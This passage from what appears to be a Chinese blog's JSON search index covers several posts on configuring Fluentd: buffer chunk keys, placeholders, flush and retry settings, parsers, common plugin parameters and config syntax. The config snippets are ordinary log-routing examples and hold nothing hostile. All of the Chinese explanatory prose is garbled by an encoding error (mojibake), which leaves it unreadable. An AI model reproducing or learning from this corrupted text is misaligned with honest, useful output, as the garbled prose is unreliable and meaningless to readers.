/tmp/messages.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch os.**\u003e @type file path /opt/demo1/demo1-${tag}.log \u003cbuffer tag\u003e @type file path /tmp/demo1.buffer timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e å¯ä»¥çœ‹åˆ°è¢«åˆ†ä¸ºä¸¤ä¸ªç¼“å†²æ–‡ä»¶äº† Timeï¼š å½“åŒºå—é”®ä¸ºtimeæ—¶ï¼Œä¼šæ ¹æ®timekeyçš„æ—¶é—´æ¥åˆ†é…ä¸åŒçš„ç¼“å†²åŒºï¼Œåœ¨timekey_waitæŒ‡å®šçš„æ—¶é—´åˆ·å‡ºç¼“å†²åŒºã€‚ å¯ä»¥çœ‹ä¸‹ä¸‹é¢çš„ä¾‹å­ï¼Œæ¯60ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„ç¼“å†²åŒºï¼Œå»¶è¿Ÿ5ç§’ååˆ·å‡º \u003csource\u003e @type tail path /var/log/messages tag os.messages pos_file /tmp/messages.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch os.**\u003e @type file path /opt/demo1 \u003cbuffer time\u003e @type file timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e æ ¹æ®ä¸åŒæ—¶é—´è¾“å‡ºåˆ°æ–°çš„æ—¥å¿—æ–‡ä»¶ä¸­ å…¶ä»–åŒºå—é”®ï¼š å½“æŒ‡å®šå…¶ä»–(étime/tag)é”®æ—¶ï¼Œè¿™äº›é”®å°†ä½œä¸ºè®°å½•çš„å­—æ®µåå¤„ç†ã€‚ è¾“å‡ºæ’ä»¶å°†æ ¹æ®è¿™äº›å­—æ®µçš„å€¼å°†äº‹ä»¶åˆ†æˆå—ã€‚ å¯ä»¥çœ‹ä¸‹ä¸‹é¢è¿™ä¸ªä¾‹å­ã€‚ \u003csource\u003e @type tail path /var/log/messages tag os.messages exclude_path [\"/var/log/*.gz\", \"/var/log/*.zip\"] refresh_interval 60 pos_file /tmp/os.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cfilter os.**\u003e @type record_transformer \u003crecord\u003e hostname \"#{Socket.gethostname}\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch os.**\u003e @type file path /opt/demo1/demo1-${host}.log \u003cbuffer host\u003e @type file path /tmp/demo1.buffer timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e æ–‡ä»¶åç§°ä¸­çš„${host}ï¼Œè¢«æ›¿æ¢ä¸ºæ—¥å¿—è®°å½•ä¸­çš„hostå­—æ®µ å¯ä»¥ä½¿ç”¨è®°å½•è®¿é—®å™¨è¯­æ³•æ¥ä½¿ç”¨åµŒå¥—å­—æ®µ \u003cbuffer $.nest.field\u003e # è®¿é—®è®°å½•çš„nest.fieldå­—æ®µ ç»„åˆé”® ç¼“å†²åŒºå—é”®å¯ä»¥æŒ‡å®š2ä¸ªæˆ–æ›´å¤šçš„é”®â€”â€”äº‹ä»¶å°†é€šè¿‡å—é”®å€¼çš„ç»„åˆè¢«åˆ†å‰²æˆå— # \u003cbuffer tag,time\u003e 11:58:01 ssh.login {\"key1\":\"yay\",\"key2\":100} ------\u003e CHUNK_A 11:59:13 web.access {\"key1\":\"yay\",\"key2\":100} --| |---\u003e CHUNK_B 11:59:30 web.access {\"key1\":\"yay\",\"key2\":100} --| 12:00:01 web.access {\"key1\":\"foo\",\"key2\":200} ------\u003e CHUNK_C 12:00:25 ssh.login {\"key1\":\"yay\",\"key2\":100} ------\u003e CHUNK_D ç©ºé”® å½“è¾“å‡ºæ’ä»¶æœ‰é»˜è®¤çš„å—é”®æ—¶ï¼Œç¦ç”¨å®ƒ \u003cmatch tag.**\u003e # ... \u003cbuffer []\u003e # ... \u003c/buffer\u003e \u003c/match\u003e ","date":"2020-05-29 18:29","objectID":"/post/1739/:1:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å ä½ç¬¦ å½“æŒ‡å®šåŒºå—é”®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åŒºå—é”®ä½œä¸ºå˜é‡ä½¿ç”¨ã€‚ è¿™å–å†³äºæ’ä»¶æ˜¯å¦å¯¹é…ç½®å€¼åº”ç”¨æ–¹æ³•(extract_placeholders)ã€‚ \u003cmatch log.*\u003e @type file path /data/${tag}/access.${key1}.log #=\u003e \"/data/log.map/access.yay.log\" \u003cbuffer tag,key1\u003e # ... \u003c/buffer\u003e \u003c/match\u003e ##åŒºå—é”®å‚æ•°time timekeyï¼šå¿…é¡»ï¼Œæ²¡æœ‰é»˜è®¤å€¼ã€‚è¾“å‡ºæ’ä»¶å°†åœ¨æŒ‡å®šçš„æ—¶é—´åˆ·æ–°å—ï¼Œåœ¨åŒºå—é”®æ˜¯timeçš„æ—¶å€™ä½¿ç”¨ timekey_waitï¼šé»˜è®¤600sï¼Œè¾“å‡ºæ’ä»¶åœ¨timekeyæ—¶é—´åçš„timekey_waitç§’åå†™å…¥å— timekey_use_utcï¼šé»˜è®¤falseï¼Œæ˜¯å¦ä½¿ç”¨utcæ—¶é—´ timekey_zoneï¼šé»˜è®¤æœ¬åœ°æ—¶åŒºï¼Œå¯ä»¥ä½¿ç”¨ä¾‹å¦‚+0800æˆ–Asia/Shanghai ","date":"2020-05-29 18:29","objectID":"/post/1739/:2:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ç¼“å†²å‚æ•° chunk_limit_size: é»˜è®¤å€¼å†…å­˜8MBï¼Œæ–‡ä»¶256MBï¼Œæ¯ä¸ªå—çš„æœ€å¤§å¤§å° chunk_limit_records: æ¯ä¸ªåŒºå—å¯ä»¥å­˜å‚¨çš„æœ€å¤§äº‹ä»¶æ•° total_limit_size: é»˜è®¤å€¼å†…å­˜512MBï¼Œæ–‡ä»¶64GBï¼Œæ­¤ç¼“å†²æ’ä»¶ç¤ºä¾‹çš„æ€»å¤§å°é™åˆ¶ queue_limit_length: é»˜è®¤0ï¼Œæ­¤ç¼“å†²åŒºæ’ä»¶å®ä¾‹çš„é˜Ÿåˆ—é•¿åº¦é™åˆ¶ chunk_full_threshold: é»˜è®¤0.95(95%)ï¼Œåˆ·æ–°ç¼“å†²å—çš„é˜ˆå€¼ç™¾åˆ†æ¯”ï¼Œchunk_limit_size * chunk_full_threshold(8M*0.95),ä¹Ÿå°±æ˜¯ç¼“å†²å—å ç”¨è¶…è¿‡95%åˆ·å‡º. queued_chunks_limit_size: é»˜è®¤å€¼1ï¼Œé™åˆ¶é˜Ÿåˆ—åŒºå—çš„æ•°é‡ã€‚ compress: é»˜è®¤ï¼štextä¸å‹ç¼©ï¼Œå¯ä»¥ä½¿ç”¨gzipå‹ç¼© ","date":"2020-05-29 18:29","objectID":"/post/1739/:3:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"åˆ·æ–°å‚æ•° flush_at_shutdown: é»˜è®¤å€¼:å¯¹äºæŒä¹…æ€§ç¼“å†²åŒºï¼ˆä¾‹å¦‚buf_fileï¼‰ä¸ºfalseï¼Œå¯¹äºéæŒä¹…æ€§ç¼“å†²åŒºï¼ˆä¾‹å¦‚buf_memoryï¼‰ä¸ºtrueã€‚æ˜¯å¦åœ¨å…³é—­æ—¶åˆ·æ–°/å†™å…¥æ‰€æœ‰ç¼“å†²åŒºå—çš„å€¼ flush_modeï¼š lazy: æ ¹æ®timekey interval: æ¯éš”flush_intervalåˆ·æ–°ä¸€æ¬¡ immediate: äº‹ä»¶è¿›å…¥ç¼“å†²å—åç«‹å³åˆ·ç©º flush_interval é»˜è®¤60s flush_thread_countï¼š é»˜è®¤1ï¼Œåˆ·æ–°å—çš„çº¿ç¨‹æ•°ï¼Œç”¨äºå¹¶è¡Œåˆ·æ–°ç¼“å†²å— flush_thread_intervalï¼š é»˜è®¤1ï¼Œå¦‚æœæ²¡æœ‰ç¼“å†²å—ç­‰å¾…è¢«åˆ·å‡ºï¼Œçº¿ç¨‹ä¼‘çœ å‡ ç§’ä»¥è¿›è¡Œä¸‹ä¸€æ¬¡å°è¯• flush_thread_burst_intervalï¼š é»˜è®¤1ï¼Œè¾“å‡ºæ’ä»¶åˆ·æ–°ç›¸é‚»çš„ç¼“å†²å—æ—¶ï¼Œå¯åŠ¨ä¸‹ä¸€ä¸ªè¿›ç¨‹å‰ä¼‘çœ çš„ç§’æ•° delayed_commit_timeoutï¼š é»˜è®¤60ï¼Œè¾“å‡ºæ’ä»¶ç¡®å®šå¼‚æ­¥å†™å…¥æ“ä½œå¤±è´¥çš„è¶…æ—¶ç§’æ•° overflow_actionï¼š å½“ç¼“å†²é˜Ÿåˆ—æ»¡äº†ï¼Œè¾“å‡ºæ’ä»¶çš„è¡Œä¸ºï¼š é»˜è®¤ï¼šthrow_exception throw_exceptionï¼šæ’é™¤å¼‚å¸¸ï¼Œå¹¶æ‰“å°é”™è¯¯æ—¥å¿— blockï¼šé˜»æ­¢è¾“å…¥æ’ä»¶å°†äº‹ä»¶å‘é€åˆ°è¯¥ç¼“å†²åŒº drop_oldest_chunkï¼šåˆ é™¤æœ€æ—§çš„ç¼“å†²å—ä»¥æ¥å—æ–°ä¼ å…¥çš„ç¼“å†²å— ","date":"2020-05-29 18:29","objectID":"/post/1739/:4:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"é‡è¯•å‚æ•° retry_timeoutï¼š é»˜è®¤72hï¼Œå¤±è´¥åé‡è¯•åˆ·æ–°çš„æœ€å¤§æ—¶é—´ retry_foreverï¼š é»˜è®¤falseï¼Œæ˜¯å¦æ°¸è¿œé‡è¯• retry_max_timesï¼š å¤±è´¥æ—¶é‡è¯•åˆ·æ–°çš„æœ€å¤§æ¬¡æ•° retry_typeï¼š é‡è¯•ç±»å‹ é»˜è®¤: exponential_backoff exponential_backoff: ç­‰å¾…ç§’æ•°,å°†æ ¹æ®æ•…éšœæˆå€å¢é•¿ï¼Œç”±retry_exponential_backoff_baseå†³å®š periodic: å›ºå®šé—´éš”é‡è¯•retry_wait retry_waitï¼š é»˜è®¤1s,åœ¨ä¸‹ä¸€æ¬¡é‡è¯•åˆ·æ–°ä¹‹å‰è¦ç­‰å¾…çš„ç§’æ•° retry_exponential_backoff_baseï¼š é»˜è®¤2ï¼Œé‡è¯•çš„æŒ‡æ•°çš„åŸºæ•° retry_randomizeï¼š é»˜è®¤trueï¼Œå¦‚æœä¸ºtrueï¼Œåˆ™è¾“å‡ºæ’ä»¶å°†åœ¨éšæœºé—´éš”åé‡è¯•ï¼Œå¯ä»¥é˜²æ­¢çªå‘ disable_chunk_backupï¼š é»˜è®¤falseï¼Œç¦æ­¢å°†ä¸å¯æ¢å¤çš„æ•°æ®å—å­˜å‚¨åœ¨å¤‡ä»½ç›®å½•ä¸­ ","date":"2020-05-29 18:29","objectID":"/post/1739/:5:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.fluentd.org/configuration/parse-section ParseåŒºå—æ¥æŒ‡å®šå¦‚ä½•è§£æåŸå§‹æ•°æ®ã€‚Parseå¯ä»¥åœ¨,,åŒºå—ä½¿ç”¨ã€‚ä¸ºä»–ä»¬æä¾›è§£æçš„åŠŸèƒ½ã€‚ \u003csource\u003e @type tail # parameters for input plugin \u003cparse\u003e # parse section parameters \u003c/parse\u003e \u003c/source\u003e ä¸‹é¢æ˜¯ä¸€äº›å†…ç½®çš„è§£æå™¨ç±»å‹ï¼š regexp apache2 apache_error nginx syslog csv tsv ltsv json multiline none é€šè¿‡@typeå‚æ•°æ¥æŒ‡å®šè§£æå™¨æ’ä»¶çš„ç±»å‹ \u003cparse\u003e @type apache2 \u003c/parse\u003e ","date":"2020-05-28 17:10","objectID":"/post/1723/:0:0","tags":["elk","efk","fluentd"],"title":"fluentdæ•°æ®è§£æParseï¼ˆå››ï¼‰","uri":"/post/1723/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"è§£æå™¨çš„å‚æ•°(å¯é€‰)ï¼š types(hashç±»å‹-kv)ï¼šç”¨äºå°†å­—æ®µè½¬æ¢ä¸ºå…¶ä»–ç±»å‹ é»˜è®¤ï¼šæ—  å­—ç¬¦ä¸²è½¬æ¢ï¼šfield1:type, field2:type, field3:type:option, field4:type:option jsonè½¬æ¢ï¼š{\"field1\":\"type\", \"field2\":\"type\", \"field3\":\"type:option\", \"field4\":\"type:option\"} ç¤ºä¾‹ï¼štypes user_id:integer,paid:bool,paid_usd_amount:float æ”¯æŒçš„å­—æ®µç±»å‹ï¼šstringã€boolã€integerã€floatã€timeã€array time_key(å­—ç¬¦ä¸²ç±»å‹)ï¼šä»äº‹ä»¶çš„ä»€ä¹ˆå­—æ®µä¸­è·å–æ—¶é—´ï¼Œå¦‚æœè¯¥å­—æ®µä¸å­˜åœ¨ï¼Œåˆ™å–å½“å‰æ—¶é—´ null_empty_stringï¼šå°†ç©ºå€¼æ›¿æ¢ä¸ºnilï¼Œé»˜è®¤ä¸ºfalse estimate_current_event(å¸ƒå°”å‹)ï¼šæ˜¯å¦ä»¥å½“å‰æ—¶é—´ä½œä¸ºtime_keyçš„å€¼ï¼Œé»˜è®¤false keep_time_key(å¸ƒå°”å‹)ï¼šæ˜¯å¦ä¿ç•™äº‹ä»¶ä¸­çš„æ—¶é—´å­—æ®µ timeoutï¼šæ£€æµ‹é”™è¯¯çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¶…æ—¶æ—¶é—´ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªè§£ænginxè®¿é—®æ—¥å¿—çš„ç®€å•ç¤ºä¾‹ \u003csource\u003e @type tail path /path/to/input/file \u003cparse\u003e @type nginx keep_time_key true \u003c/parse\u003e \u003c/source\u003e ###æ—¶é—´å‚æ•°ï¼š time_typeï¼šenum å¯é€‰å€¼ï¼šfloatï¼šUNIXæ—¶é—´.çº³ç§’ã€unixtimeï¼š UNIXæ—¶é—´ï¼ˆç§’ï¼‰ã€stringï¼šæ ¹æ®åé¢å‡ ä¸ªå‚æ•°å†³å®šå…·ä½“æ ¼å¼ time_formatï¼šstring å‚è€ƒRuby APIï¼šæ—¶é—´æ ¼å¼åŒ–ã€æ—¶é—´è§£æï¼Œé™¤äº†éµå¾ªRubyçš„æ—¶é—´æ ¼å¼åŒ–ï¼Œè¿˜å¯ä»¥å–å€¼%iso8601 localtimeï¼šbool æ˜¯å¦ä½¿ç”¨æœ¬åœ°æ—¶é—´è€ŒéUTCï¼Œé»˜è®¤true utcï¼šbool æ˜¯å¦ä½¿ç”¨UTCè€Œéæœ¬åœ°æ—¶é—´ï¼Œé»˜è®¤false timezoneï¼šstring æŒ‡å®šæ—¶åŒºï¼Œä¾‹å¦‚+09:00ã€+0900ã€+09ã€Asia/Shanghai ","date":"2020-05-28 17:10","objectID":"/post/1723/:0:1","tags":["elk","efk","fluentd"],"title":"fluentdæ•°æ®è§£æParseï¼ˆå››ï¼‰","uri":"/post/1723/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€äº›é€šç”¨å‚æ•°å¯ç”¨äºæ‰€æœ‰ï¼ˆæˆ–éƒ¨åˆ†ï¼‰Fluentdæ’ä»¶ã€‚ 1.@typeï¼šæŒ‡å®šæ’ä»¶ç±»å‹ \u003csource\u003e @type my_plugin_type \u003c/source\u003e \u003cfilter\u003e @type my_filter \u003c/filter\u003e 2.@idï¼šæŒ‡å®šæ’ä»¶ idï¼Œåœ¨è¾“å‡ºç›‘æ§ä¿¡æ¯çš„æ—¶å€™æœ‰ç”¨ã€‚ \u003cmatch\u003e @type file @id service_www_accesslog path /path/to/my/access.log # ... \u003c/match\u003e 3.@log_levelï¼šæ­¤å‚æ•°ç”¨äºæŒ‡å®šæ’ä»¶ç‰¹å®šçš„æ—¥å¿—è®°å½•çº§åˆ«ã€‚é»˜è®¤æ—¥å¿—çº§åˆ«ä¸ºinfoã€‚å…¨å±€æ—¥å¿—çº§åˆ«å¯ä»¥ç”±\u003csystem\u003eä¸­çš„æ—¥å¿—çº§åˆ«æˆ–-v/-qå‘½ä»¤è¡Œé€‰é¡¹æŒ‡å®šã€‚@log_levelå‚æ•°åªè¦†ç›–æŒ‡å®šæ’ä»¶å®ä¾‹çš„æ—¥å¿—è®°å½•çº§åˆ«ã€‚ \u003csystem\u003e log_level info \u003c/system\u003e \u003csource\u003e # ... @log_level debug # show debug log only for this plugin \u003c/source\u003e 4.@labelï¼šå°†è¾“å…¥äº‹ä»¶è·¯ç”±åˆ°\u003clabel\u003eã€\u003cfilter\u003eå’Œ\u003cmatch\u003eåŒºå—çš„é›†åˆã€‚ \u003csource\u003e @type ... @label @access_logs # ... \u003c/source\u003e \u003csource\u003e @type ... @label @system_metrics # ... \u003c/source\u003e \u003clabel @access_log\u003e \u003cmatch **\u003e @type file path ... \u003c/match\u003e \u003c/label\u003e \u003clabel @system_metrics\u003e \u003cmatch **\u003e @type file path ... \u003c/match\u003e \u003c/label\u003e @labelå‚æ•°çš„å€¼å¿…é¡»ä»¥@å¼€å¤´ã€‚å¼ºçƒˆå»ºè®®æŒ‡å®š@labelå°†äº‹ä»¶è·¯ç”±åˆ°ä»»ä½•æ’ä»¶ã€‚å®ƒå¯ä»¥ä½¿æ•´ä¸ªé…ç½®å˜å¾—ç®€å•ã€‚ ","date":"2020-05-27 18:07","objectID":"/post/1717/:0:0","tags":["elk","efk","fluentd"],"title":"fluentdé€šç”¨å‚æ•°ï¼ˆä¸‰ï¼‰","uri":"/post/1717/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://lintingbin2009.github.io/2018/05/01/fluentd%E8%AF%AD%E6%B3%95%E9%80%9F%E8%AE%B0/ å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.fluentd.org/configuration/config-file ","date":"2020-05-27 15:13","objectID":"/post/1711/:0:0","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"é…ç½®æ–‡ä»¶è¯­æ³• ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:0","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"Fluentdäº‹ä»¶çš„ç”Ÿå‘½å‘¨æœŸ 1.æ¯ä¸ªè¾“å…¥çš„äº‹ä»¶ä¼šå¸¦æœ‰ä¸€ä¸ªtag 2.Fluentdé€šè¿‡tagåŒ¹é…output 3.Fluentdå‘é€äº‹ä»¶åˆ°åŒ¹é…çš„output 4.Fluentdæ”¯æŒå¤šä¸ªæ•°æ®æºå’Œæ•°æ®è¾“å‡º 5.é€šè¿‡è¿‡æ»¤å™¨ï¼Œäº‹ä»¶å¯ä»¥è¢«é‡æ–°è§¦å‘ ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:1","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"1. â€œsourceâ€: å®šä¹‰æ•°æ®æº æ•°æ®æºå¯ä»¥åœ¨sourceæŒ‡ä»¤ä¸­å®šä¹‰ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥å®šä¹‰httpå’Œforwardçš„æ•°æ®æºã€‚httpæ•°æ®æºå¯ä»¥é€šè¿‡httpåè®®æ¥æ¥æ”¶æ•°æ®ï¼Œforwardå¯ä»¥é€šè¿‡tcpåè®®æ¥æ¥æ”¶æ•°æ®ã€‚ # Receive events from 24224/tcp # This is used by log forwarding and the fluent-cat command \u003csource\u003e @type forward port 24224 \u003c/source\u003e # http://this.host:9880/myapp.access?json={\"event\":\"data\"} \u003csource\u003e @type http port 9880 \u003c/source\u003e æ‰€æœ‰sourceæŒ‡ä»¤ä¸­å¿…é¡»åŒ…å«@typeå‚æ•°ï¼Œè¯¥å‚æ•°ç”¨æ¥æŒ‡å®šä½¿ç”¨å“ªä¸ªè¾“å…¥æ’ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿˜å¯ä»¥ç”¨tailæ’ä»¶æ¥è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚ è·¯ç”± sourceæŒ‡ä»¤æŠŠäº‹ä»¶æäº¤åˆ°Fluentdçš„è·¯ç”±å¼•æ“ã€‚ä¸€ä¸ªäº‹ä»¶ç”±ä¸‰ä¸ªå®ä½“ç»„æˆï¼štagã€timeå’Œrecordã€‚tagæ˜¯ç”±â€™.â€™åˆ†å‰²çš„å­—ç¬¦ä¸²ç»„æˆï¼Œè¢«å†…éƒ¨è·¯ç”±å¼•æ“ä½¿ç”¨ã€‚timeç”±inputæ’ä»¶æŒ‡å®šï¼Œå¿…é¡»æ˜¯Unixæ—¶é—´æˆ³æ ¼å¼ã€‚recordæ˜¯ä¸€ä¸ªJsonå¯¹è±¡ã€‚ ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:2","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"2.â€œmatchâ€: å®šä¹‰æ•°æ®çš„è¾“å‡ºç›®æ ‡ matchæŒ‡ä»¤é€šè¿‡åŒ¹é…tagå­—æ®µæ¥å°†äº‹ä»¶è¾“å‡ºåˆ°å…¶ä»–çš„ç³»ç»Ÿã€‚åŒæ ·matchæŒ‡ä»¤ä¹Ÿå¿…é¡»æŒ‡å®š@typeå‚æ•°ï¼Œè¯¥å‚æ•°ç”¨æ¥æŒ‡å®šä½¿ç”¨å“ªä¸ªè¾“å‡ºæ’ä»¶ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œåªæœ‰myapp.accessçš„tagèƒ½å¤ŸåŒ¹é…åˆ°è¯¥è¾“å‡ºæ’ä»¶ã€‚ \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e åŒ¹é…æ¨¡å¼ ä¸‹é¢çš„è¿™äº›åŒ¹é…æ¨¡å¼å¯ä»¥åœ¨ä¸­ä½¿ç”¨ï¼Œç”¨æ¥åŒ¹é…tag: *ç”¨æ¥åŒ¹é…tagçš„ä¸€éƒ¨åˆ†ï¼ˆæ¯”å¦‚ï¼ša.*å¯ä»¥åŒ¹é…a.bï¼Œä½†æ˜¯ä¸èƒ½åŒ¹é…aæˆ–è€…a.b.cï¼‰ **å¯ä»¥ç”¨æ¥åŒ¹é…tagçš„0ä¸ªæˆ–å¤šä¸ªéƒ¨åˆ†ï¼ˆæ¯”å¦‚ï¼ša.**å¯ä»¥åŒ¹é…aã€a.bå’Œa.b.cï¼‰ {X,Y,Z}åŒ¹é…X,Yæˆ–è€…Zï¼ˆæ¯”å¦‚ï¼š{a,b}å¯ä»¥åŒ¹é…aå’Œbï¼Œä½†æ˜¯ä¸èƒ½åŒ¹é…cã€‚ä»–å¯ä»¥å’Œ*æˆ–è€…**ç»“åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ã€‚ï¼‰ å¦‚æœæœ‰å¤šä¸ªåŒ¹é…æ¨¡å¼å†™åœ¨é‡Œé¢ï¼Œåˆ™å¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€(æ¯”å¦‚ï¼š\u003cmatch a b\u003eèƒ½å¤ŸåŒ¹é…aå’Œbã€‚\u003cmatch a.** b.* \u003eèƒ½å¤ŸåŒ¹é…a,a.b,a.b.cå’Œb.dã€‚) åŒ¹é…é¡ºåº Fluentdæ˜¯æŒ‰é¡ºåºåŒ¹é…çš„ï¼Œå…ˆåœ¨é…ç½®æ–‡ä»¶é‡Œé¢å‡ºç°çš„matchä¼šå…ˆåŒ¹é…ã€‚ä¸‹é¢çš„ä¾‹å­ä¸­myapp.accessæ°¸è¿œéƒ½ä¸ä¼šè¢«åŒ¹é…åˆ°ã€‚ # ** matches all tags. Bad :( \u003cmatch **\u003e @type blackhole_plugin \u003c/match\u003e \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:3","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"3.â€œfilterâ€ï¼šäº‹ä»¶å¤„ç†ç®¡é“ â€œfilterâ€æŒ‡ä»¤çš„è¯­æ³•å’Œâ€matchâ€æŒ‡ä»¤çš„è¯­æ³•ç›¸åŒï¼Œä½†æ˜¯â€filterâ€èƒ½å¤Ÿåœ¨ç®¡é“ä¸­è¢«è¿èµ·æ¥å¤„ç†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š Input -\u003e filter 1 -\u003e ... -\u003e filter N -\u003e Output\u003c/code\u003e\u003c/pre\u003e ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†record_transformer fliterçš„ç”¨æ³•ã€‚sourceé¦–å…ˆä¼šæ¥æ”¶åˆ°ä¸€ä¸ª{â€œeventâ€:â€dataâ€}çš„äº‹ä»¶ï¼Œç„¶åè¯¥äº‹ä»¶ä¼šé¦–å…ˆè¢«è·¯ç”±åˆ°filterï¼Œfilterä¼šå¢åŠ ä¸€ä¸ªhost_paramçš„å­—æ®µåˆ°recordä¸­ï¼Œç„¶åå†æŠŠè¯¥äº‹ä»¶å‘é€åˆ°matchä¸­ã€‚ # http://this.host:9880/myapp.access?json={\"event\":\"data\"} \u003csource\u003e @type http port 9880 \u003c/source\u003e \u003cfilter myapp.access\u003e @type record_transformer \u003crecord\u003e host_param \"#{Socket.gethostname}\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:4","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"4.â€œsystemâ€ï¼šè®¾ç½®ç³»ç»ŸèŒƒå›´é…ç½®(æ›´è¯¦ç»†çš„é€‰é¡¹https://docs.fluentd.org/deployment/system-config) ä»¥ä¸‹çš„é…ç½®èƒ½å¤Ÿç”±â€systemâ€æŒ‡ä»¤æŒ‡å®šã€‚ä¹Ÿå¯ä»¥é€šè¿‡Fluentdçš„å‘½ä»¤è¡Œé…ç½®é€‰é¡¹è®¾ç½®ç›¸åŒçš„é…ç½®: log_level suppress_repeated_stacktrace emit_error_log_interval suppress_config_dump without_source process_name (åªèƒ½ç”¨â€systemâ€æŒ‡ä»¤æŒ‡å®š) ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š \u003csystem\u003e # ç­‰åŒäº-qqé€‰é¡¹ã€‚ (-v: debug, -vv: traceï¼Œ-q: warn, -qq: error) log_level error # ç­‰åŒäº--without-sourceé€‰é¡¹ without_source # ... \u003c/system\u003e process_nameå‚æ•°è¡¨ç¤ºä¿®æ”¹fluentdçš„supervisorå’Œworkerè¿›ç¨‹åç§° \u003csystem\u003e process_name fluentd1 \u003c/system\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:5","tags":["elk","efk","fluentd"],"title":"fluentdé…ç½®æ–‡ä»¶è¯­æ³•(äºŒ)","uri":"/post/1711/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"5.â€œlabelâ€ï¼šç”¨æ¥ç»„ç»‡filterå’Œmatch 